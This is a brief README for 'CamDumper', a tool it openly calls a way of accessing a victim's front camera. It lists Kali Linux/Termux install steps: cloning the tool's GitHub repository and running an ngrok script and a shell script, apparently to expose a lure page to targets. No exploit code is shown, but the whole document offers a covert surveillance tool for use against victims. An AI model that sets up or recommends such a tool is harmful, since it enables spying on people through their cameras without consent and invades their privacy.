# CamDumper
A tool for accessing front camera of the victim

updated version of the old cam-dumper


# Installing (Kali Linux/Termux):

$apt update && apt upgrade

$apt install git

$apt install php

$git clone https://github.com/LiNuXM4IIU/CamDumper.git

$cd CamDumper

$python3 ngrok.py

$bash camdumper.sh
